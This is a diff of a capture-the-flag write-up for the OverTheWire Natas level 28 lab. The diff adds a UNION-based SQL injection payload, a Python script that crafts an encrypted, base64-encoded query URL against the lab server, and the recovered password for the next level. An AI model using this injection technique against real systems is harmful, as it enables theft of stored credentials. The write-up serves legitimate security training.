@@ -6,6 +6,9 @@ Password: `skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4`<br />
 URL:      http://natas28.natas.labs.overthewire.org
 
 ## Solution
+Wow that took a long time out of my life...<br />
+Let's start:
+
 ![](0.png)
 
 ![](1.png)
@@ -173,10 +176,35 @@ print('http://natas28.natas.labs.overthewire.org/search.php/?query=' + quote(b64
 
 ![](11.png)
 
-It worked!!
-We can now perform any sql injection we want!
+It worked!!<br />
+Can we get the password now?<br />
+The input `*********' union select password from users-- -` will give us:<br />
+![](12.png)
+
+We will now build the url exactly as before:
+```python
+from urllib.parse import quote
+from base64 import b64encode
+
+fixed_bytes = "1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2"
+Keeps_6_bytes = "60a227d6fb6eddec61d83de2500edd76"
+user_input_and_the_rest = "f89dd8dbec15c6a6d9993a3dc7b7a308 86951754f7ad56454eb5d5b6768ee646 27d788aa2b09337e8d4bcc1e820f6370 a77e8ed1aabe0b5d05c4ffe6ac1423ab 478eb1a1fe261a2c6c15061109b3feda"
+
+q = (fixed_bytes + Keeps_6_bytes + user_input_and_the_rest).replace(' ', '')
+
+print('http://natas28.natas.labs.overthewire.org/search.php/?query=' + quote(b64encode(bytes.fromhex(q))))
+
+# Output:
+# http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJgoifW%2B27d7GHYPeJQDt12%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kYn14iqKwkzfo1LzB6CD2Nwp36O0aq%2BC10FxP/mrBQjq0eOsaH%2BJhosbBUGEQmz/to%3D
+```
+
+![](13.png)
+
+That is, we collected 0 jokes from their table, and guessed correctly that the table relevant to the solution is called "users". It turns out that there is only one user in *users*, natas29.<br />
+That's the password!!!<br />
+Have a wonderful day!
 
 ## Password for the next level:
 ```
-
+pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno
 ```
